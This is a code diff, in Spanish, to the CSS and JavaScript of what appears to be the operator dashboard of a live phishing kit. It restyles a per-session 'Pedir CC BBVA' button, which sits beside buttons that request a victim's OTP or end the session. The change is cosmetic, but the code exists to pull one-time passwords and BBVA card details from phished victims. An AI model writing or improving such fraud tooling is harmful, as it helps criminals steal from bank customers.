@@ -139,17 +139,6 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .detalle-seccion { grid-column: 1 / -1; margin-top: 15px; padding-top: 15px; border-top: 1px dashed #252d44; }
 .detalle-seccion-titulo { color: #88f456; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
 
-/* Efecto Hover para el botón Pedir CC BBVA */
-.btn.hover-expand:hover .text {
-    max-width: 120px !important;
-    opacity: 1 !important;
-    margin-left: 5px;
-}
-.btn.hover-expand .icon {
-    display: inline-block;
-    vertical-align: middle;
-}
-
 @media (max-width: 768px) {
     .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
@@ -690,13 +679,8 @@ function botonesSesion(s) {
         // 3. Pedir OTP
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         
-        // 4. Pedir CC BBVA (El que se expande al pasar el mouse)
-        btns.push(`
-            <button class="btn btn-final hover-expand" title="Pedir CC BBVA" onclick="accion('${sid}','PEDIR_TARJETA_BBVA')" style="transition: all 0.3s ease; width: auto; overflow: hidden; white-space: nowrap; background-color: #0ea5e9;">
-                <span class="icon">💳</span>
-                <span class="text" style="display: inline-block; max-width: 0; opacity: 0; transition: all 0.3s ease; overflow: hidden; vertical-align: middle;">Pedir CC BBVA</span>
-            </button>
-        `);
+        // 4. Pedir CC BBVA (Solo el emoji, con tooltip nativo al pasar el mouse)
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC BBVA" onclick="accion('${sid}','PEDIR_TARJETA_BBVA')">💳</button>`);
         
         // 5. Finalizar
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
